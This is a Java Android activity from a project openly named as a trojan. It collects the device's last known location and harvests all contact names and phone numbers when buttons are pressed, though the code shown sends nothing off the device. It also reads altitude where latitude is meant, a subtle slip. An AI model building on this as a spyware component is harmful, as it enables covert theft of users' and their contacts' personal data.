package trojan.android.android_trojan;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.util.ArrayList;

/**
 * Created by Jean-Laurent on 26/11/2014.
 */
public class second_activity extends Activity {
    private static final String TAG = "second_activity";
    private Button button21;
    private Button button22;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.second_activity);
        button21 = (Button) findViewById(R.id.button21);
        button22 = (Button) findViewById(R.id.button22);
        button21.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                GetLocation();
            }
        });

        button22.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Contacts();
            }
        });

    }

    public double[] GetLocation(){
        LocationManager locManager = (LocationManager)getSystemService(LOCATION_SERVICE);
        Location location = locManager.getLastKnownLocation(locManager.getBestProvider(new Criteria(), false));
        double[] result = new double[2];

        try{
            Log.d(TAG, location.getAltitude()+";"+ location.getLongitude());
            result[0] = location.getAltitude();
            result[1] = location.getLongitude();
        }catch (Exception ex){
            Log.d(TAG, ex.getMessage());
            result[0] = 0;
            result[1] = 0;
        }
        return result;
    }

    public ArrayList Contacts(){
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        ArrayList<String[]> contacts = new ArrayList<String[]>();

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                if (Integer.parseInt(cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contacts.add(new String[]{name, phoneNo});
                    }
                    pCur.close();
                }
            }
        }
        return contacts;
    }
}
